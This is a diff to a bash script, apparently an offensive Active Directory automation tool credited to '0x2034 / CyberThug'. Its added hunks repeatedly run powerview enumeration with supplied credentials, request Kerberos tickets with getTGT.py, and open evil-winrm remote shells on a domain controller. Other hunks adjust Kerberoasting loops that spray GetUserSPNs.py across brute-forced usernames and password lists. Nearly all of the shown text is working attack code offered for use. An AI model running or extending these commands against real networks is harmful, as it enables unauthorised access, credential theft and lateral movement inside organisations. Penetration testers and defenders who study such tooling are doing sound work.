@@ -1,4 +1,4 @@
-#!/bin/bash 
+#!/bin/bash
 ########################################
 ####  [+]-- Author: 0x2034 --[+]  ####
 ####   [+]--   CyberThug    --[+]   ####
@@ -71,6 +71,34 @@ echo -e \"\e[1;32m[+] User: \$user\e[0m\"
 echo -e \"\e[1;32m[+] Password: \$p\e[0m\"
 echo -e \"\e[1;32m[+] DC: \$DC\e[0m\"
 echo -e \"\e[1;32m[+] Domain: \$CLEAN_DOMAIN\e[0m\"
+echo -e \"\e[1;32m[+] Trying powerview direct auth for \$user ...\e[0m\"
+echo \"\"
+echo -e \"\e[1;32m[+]-- Running powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC --[+]\e[0m\"
+echo \"\"
+powerview \"\$CLEAN_DOMAIN/\$user:\$p@\$DC\"
+echo \"\"
+echo -e \"\e[1;32m[+] Getting TGT for \$user ...\e[0m\"
+echo \"\"
+getTGT.py \"\$CLEAN_DOMAIN/\$user:\$p\" -dc-ip \"\$Ip\" -k
+export KRB5CCNAME=\$PWD/\${user}.ccache
+echo \"\"
+echo -e \"\e[1;32m[+]-- powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC -k --[+]\e[0m\"
+echo \"\"
+powerview \"\$CLEAN_DOMAIN/\$user:\$p@\$DC\" -k
+echo \"\"
+echo -e \"\e[1;33m[!] powerview failed for \$user again with ticket\e[0m\"
+exec bash'
+        gnome-terminal -- bash -c '
+export DC='__$DC__'
+export CLEAN_DOMAIN='__$CLEAN_DOMAIN__'
+export Ip='__$Ip__'
+user=\"'\$user'\"
+p=\"'\$p'\"
+
+echo -e \"\e[1;32m[+] User: \$user\e[0m\"
+echo -e \"\e[1;32m[+] Password: \$p\e[0m\"
+echo -e \"\e[1;32m[+] DC: \$DC\e[0m\"
+echo -e \"\e[1;32m[+] Domain: \$CLEAN_DOMAIN\e[0m\"
 echo -e \"\e[1;32m[+] Ip: \$Ip\e[0m\"
 
 echo -e \"\e[1;32m[+] Trying Evil-WinRM direct auth for \$user ...\e[0m\"
@@ -89,7 +117,6 @@ if [ \$? -ne 0 ]; then
 
     if [ -f \"\${user}.ccache\" ]; then
         export KRB5CCNAME=\$PWD/\${user}.ccache
-        echo -e \"\e[1;32m[+] Exported KRB5CCNAME=\$KRB5CCNAME \e[0m\"
 	echo \"\"
 	echo -e \"\e[1;34m[+]-- Running evil-winrm -i \$DC -u \$user -r \$CLEAN_DOMAIN --[+]\e[0m\"
 	echo \"\"  
@@ -159,6 +186,33 @@ interact
 EOF
         chmod +x /tmp/temp2.sh
         bash /tmp/temp2.sh
+        gnome-terminal -- bash -c \"
+export DC='$DC'
+export CLEAN_DOMAIN='$CLEAN_DOMAIN'
+export user='$user'
+export p='$p'
+
+echo -e '\e[1;32m[+] User: \$user\e[0m'
+echo -e '\e[1;32m[+] Password: \$p\e[0m'
+echo -e '\e[1;32m[+] DC: \$DC\e[0m'
+echo -e '\e[1;32m[+] Domain: \$CLEAN_DOMAIN\e[0m'
+echo -e '\e[1;32m[+] Trying powerview direct auth for \$user ...\e[0m'
+echo ''
+echo -e '\e[1;32m[+]-- Running powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC --[+]\e[0m'
+echo ''
+powerview \"\$CLEAN_DOMAIN/\$user:\$p@\$DC\"
+echo ''
+echo -e '\e[1;32m[+] Getting TGT for \$user ...\e[0m'
+echo ''
+getTGT.py \"\$CLEAN_DOMAIN/\$user:\$p\" -dc-ip \"\$Ip\" -k
+export KRB5CCNAME=\$PWD/\${user}.ccache
+echo ''
+echo -e '\e[1;32m[+]-- powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC -k --[+]\e[0m'
+echo ''
+powerview \"\$CLEAN_DOMAIN/\$user:\$p@\$DC\" -k
+echo ''
+echo -e '\e[1;33m[!] powerview failed for \$user again with ticket\e[0m'
+exec bash\"  
         gnome-terminal -- bash -c '
 export DC=\"'$DC'\"
 export CLEAN_DOMAIN=\"'$CLEAN_DOMAIN'\"
@@ -188,7 +242,6 @@ if [ \$? -ne 0 ]; then
 
     if [ -f \"\${user}.ccache\" ]; then
         export KRB5CCNAME=\$PWD/\${user}.ccache
-        echo -e \"\e[1;32m[+] Exported KRB5CCNAME=\$KRB5CCNAME \e[0m\"
         echo \"\"
         echo -e \"\e[1;34m[+]-- Running evil-winrm -i \$DC -u \$user -r \$CLEAN_DOMAIN --[+]\e[0m\"
         echo ''   
@@ -253,6 +306,34 @@ interact
 EOT
         chmod +x /tmp/temp4.sh
         bash /tmp/temp4.sh
+        gnome-terminal -- bash -c '
+export DC='__$DC__'
+export CLEAN_DOMAIN='__$CLEAN_DOMAIN__'
+export Ip='__$Ip__'
+user=\"'\$user'\"
+p=\"'\$p'\"
+
+echo -e \"\e[1;32m[+] User: \$user\e[0m\"
+echo -e \"\e[1;32m[+] Password: \$p\e[0m\"
+echo -e \"\e[1;32m[+] DC: \$DC\e[0m\"
+echo -e \"\e[1;32m[+] Domain: \$CLEAN_DOMAIN\e[0m\"
+echo -e \"\e[1;32m[+] Trying powerview direct auth for \$user ...\e[0m\"
+echo \"\"
+echo -e \"\e[1;32m[+]-- Running powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC --[+]\e[0m\"
+echo \"\"
+powerview \"\$CLEAN_DOMAIN/\$user:\$p@\$DC\"
+echo \"\"
+echo -e \"\e[1;32m[+] Getting TGT for \$user ...\e[0m\"
+echo \"\"
+getTGT.py \"\$CLEAN_DOMAIN/\$user:\$p\" -dc-ip \"\$Ip\" -k
+export KRB5CCNAME=\$PWD/\${user}.ccache
+echo \"\"
+echo -e \"\e[1;32m[+]-- powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC -k --[+]\e[0m\"
+echo \"\"
+powerview \"\$CLEAN_DOMAIN/\$user:\$p@\$DC\" -k
+echo \"\"
+echo -e \"\e[1;33m[!] powerview failed for \$user again with ticket\e[0m\"
+exec bash'  
         gnome-terminal -- bash -c \"
 export DC='__$DC__'
 export CLEAN_DOMAIN='__$CLEAN_DOMAIN__'
@@ -281,7 +362,6 @@ if [ \$? -ne 0 ]; then
 
   if [ -f \"\${user}.ccache\" ]; then
     export KRB5CCNAME=\$PWD/\${user}.ccache
-    echo -e '\e[1;32m[+] Exported KRB5CCNAME=\$KRB5CCNAME\e[0m'
     echo ''
     echo -e '\e[1;34m[+]-- Running evil-winrm -i \$DC -u \$user -r \$CLEAN_DOMAIN --[+]\e[0m'
     echo ''  
@@ -347,7 +427,33 @@ EOF
 
         chmod +x /tmp/temp1.sh
         bash /tmp/temp1.sh
+        gnome-terminal -- bash -c \"
+export DC='$DC'
+export CLEAN_DOMAIN='$CLEAN_DOMAIN'
+export user='$user'
+export p='$p'
 
+echo -e '\e[1;32m[+] User: \$user\e[0m'
+echo -e '\e[1;32m[+] Password: \$p\e[0m'
+echo -e '\e[1;32m[+] DC: \$DC\e[0m'
+echo -e '\e[1;32m[+] Domain: \$CLEAN_DOMAIN\e[0m'
+echo -e '\e[1;32m[+] Trying powerview direct auth for \$user ...\e[0m'
+echo ''
+echo -e '\e[1;32m[+]-- Running powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC --[+]\e[0m'
+echo ''
+powerview \"\$CLEAN_DOMAIN/\$user:\$p@\$DC\"
+echo ''
+echo -e '\e[1;32m[+] Getting TGT for \$user ...\e[0m'
+echo ''
+getTGT.py \"\$CLEAN_DOMAIN/\$user:\$p\" -dc-ip \"\$Ip\" -k
+export KRB5CCNAME=\$PWD/\${user}.ccache
+echo ''
+echo -e '\e[1;32m[+]-- powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC -k --[+]\e[0m'
+echo ''
+powerview \"\$CLEAN_DOMAIN/\$user:\$p@\$DC\" -k
+echo ''
+echo -e '\e[1;33m[!] powerview failed for \$user again with ticket\e[0m'
+exec bash\"  
         gnome-terminal -- bash -c \"
 export DC='$DC'
 export CLEAN_DOMAIN='$CLEAN_DOMAIN'
@@ -377,7 +483,6 @@ if [ \$? -ne 0 ]; then
     if [ -f \"\${user}.ccache\" ]; then
         mv \"\${user}.ccache\" \"/tmp/\${user}.ccache\"
         export KRB5CCNAME=\"/tmp/\${user}.ccache\"
-        echo -e '\\e[1;32m[+] Exported KRB5CCNAME=\$KRB5CCNAME \\e[0m'
         echo ''
         echo -e '\e[1;34m[+]-- Running evil-winrm -i \$DC -u \$user -r \$CLEAN_DOMAIN --[+]\e[0m'
         echo ''   
@@ -457,6 +562,35 @@ echo -e \"\e[1;32m[+] User: \$user\e[0m\"
 echo -e \"\e[1;32m[+] Password: \$p\e[0m\"
 echo -e \"\e[1;32m[+] DC: \$DC\e[0m\"
 echo -e \"\e[1;32m[+] Domain: \$CLEAN_DOMAIN\e[0m\"
+echo -e \"\e[1;32m[+] Trying powerview direct auth for \$user ...\e[0m\"
+echo \"\"
+echo -e \"\e[1;32m[+]-- Running powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC --[+]\e[0m\"
+echo \"\"
+powerview \"\$CLEAN_DOMAIN/\$user:\$p@\$DC\"
+echo \"\"
+echo -e \"\e[1;32m[+] Getting TGT for \$user ...\e[0m\"
+echo \"\"
+getTGT.py \"\$CLEAN_DOMAIN/\$user:\$p\" -dc-ip \"\$Ip\" -k
+export KRB5CCNAME=\$PWD/\${user}.ccache
+echo \"\"
+echo -e \"\e[1;32m[+]-- powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC -k --[+]\e[0m\"
+echo \"\"
+powerview \"\$CLEAN_DOMAIN/\$user:\$p@\$DC\" -k
+echo \"\"
+echo -e \"\e[1;33m[!] powerview failed for \$user again with ticket\e[0m\"
+exec bash'  
+
+        gnome-terminal -- bash -c '
+export DC='__$DC__'
+export CLEAN_DOMAIN='__$CLEAN_DOMAIN__'
+export Ip='__$Ip__'
+user=\"'\$user'\"
+p=\"'\$p'\"
+
+echo -e \"\e[1;32m[+] User: \$user\e[0m\"
+echo -e \"\e[1;32m[+] Password: \$p\e[0m\"
+echo -e \"\e[1;32m[+] DC: \$DC\e[0m\"
+echo -e \"\e[1;32m[+] Domain: \$CLEAN_DOMAIN\e[0m\"
 echo -e \"\e[1;32m[+] Ip: \$Ip\e[0m\"
 
 echo -e \"\e[1;32m[+] Trying Evil-WinRM direct auth for \$user ...\e[0m\"
@@ -475,7 +609,6 @@ if [ \$? -ne 0 ]; then
 
     if [ -f \"\${user}.ccache\" ]; then
         export KRB5CCNAME=\$PWD/\${user}.ccache
-        echo -e \"\e[1;32m[+] Exported KRB5CCNAME=\$KRB5CCNAME \e[0m\"
         echo \"\"
 	echo -e \"\e[1;34m[+]-- Running evil-winrm -i \$DC -u \$user -r \$CLEAN_DOMAIN --[+]\e[0m\"
         echo \"\"
@@ -550,6 +683,33 @@ EOF
 
         chmod +x /tmp/temp.sh
         bash /tmp/temp.sh
+        gnome-terminal -- bash -c \"
+export DC='$DC'
+export CLEAN_DOMAIN='$CLEAN_DOMAIN'
+export user='$user'
+export p='$p'
+
+echo -e '\e[1;32m[+] User: \$user\e[0m'
+echo -e '\e[1;32m[+] Password: \$p\e[0m'
+echo -e '\e[1;32m[+] DC: \$DC\e[0m'
+echo -e '\e[1;32m[+] Domain: \$CLEAN_DOMAIN\e[0m'
+echo -e '\e[1;32m[+] Trying powerview direct auth for \$user ...\e[0m'
+echo ''
+echo -e '\e[1;32m[+]-- Running powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC --[+]\e[0m'
+echo ''
+powerview \"\$CLEAN_DOMAIN/\$user:\$p@\$DC\"
+echo ''
+echo -e '\e[1;32m[+] Getting TGT for \$user ...\e[0m'
+echo ''
+getTGT.py \"\$CLEAN_DOMAIN/\$user:\$p\" -dc-ip \"\$Ip\" -k
+export KRB5CCNAME=\$PWD/\${user}.ccache
+echo ''
+echo -e '\e[1;32m[+]-- powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC -k --[+]\e[0m'
+echo ''
+powerview \"\$CLEAN_DOMAIN/\$user:\$p@\$DC\" -k
+echo ''
+echo -e '\e[1;33m[!] powerview failed for \$user again with ticket\e[0m'
+exec bash\"  
 
         gnome-terminal -- bash -c \"
 export DC='$DC'
@@ -568,7 +728,7 @@ echo -e '\e[1;32m[+] Trying Evil-WinRM direct auth for \$user ...\e[0m'
 echo ''
 echo -e '\e[1;34m[+]-- Running evil-winrm -i \$DC -u \$user -p \$p --[+]\e[0m'
 echo ''
-evil-winrm -i \"\$DC\" -u \"\$user\" -p \"\$p\"
+evil-winrm -i \"\$DC\" -u \"\$user\" -p \"\$p\" 
 
 if [ \$? -ne 1 ]; then
     echo ''
@@ -579,7 +739,6 @@ if [ \$? -ne 1 ]; then
 
     if [ -f \"\${user}.ccache\" ]; then
         export KRB5CCNAME=\$PWD/\${user}.ccache
-        echo -e '\e[1;32m[+] Exported KRB5CCNAME=\$KRB5CCNAME\e[0m'
         echo ''
 	echo -e '\e[1;34m[+]-- Running evil-winrm -i \$DC -u \$user -r \$CLEAN_DOMAIN --[+]\e[0m'
         echo ''   
@@ -1707,7 +1866,7 @@ exec bash
                           while read -r p; do
                               echo ""
                     	      echo -e "\033[36m$u\033[0m" 
-                              GetUserSPNs.py $CLEAN_DOMAIN/$u:$p -request $dc_host $flag 2>/dev/null
+                              GetUserSPNs.py "$CLEAN_DOMAIN/$u:$p" -request $dc_host $flag 2>/dev/null
                           done < $Password
                       done < /tmp/.test1_nxc_rid_brute
                       echo ""
@@ -5355,7 +5514,7 @@ if [[ \$(wc -l < /tmp/.test1_nxc_rid_brute) -gt 1 ]]; then
                 while read -r p; do
                     echo ""
                     echo -e "\033[36m\$u\033[0m" 
-                    GetUserSPNs.py $CLEAN_DOMAIN/\$u:\$p -request $dc_host $flag 2>/dev/null
+                    GetUserSPNs.py "$CLEAN_DOMAIN/\$u:\$p" -request $dc_host $flag 2>/dev/null
                 done < $Password
             done < /tmp/.test1_nxc_rid_brute
             echo ""
@@ -5636,4 +5795,3 @@ echo -e "\e[1;32m------------------[+] Finished [+]---------------------\e[0m"
 #      done
 #--------------------------------------
 #    elif [[ "$tool" == "exit" ]]; then
-                                                           
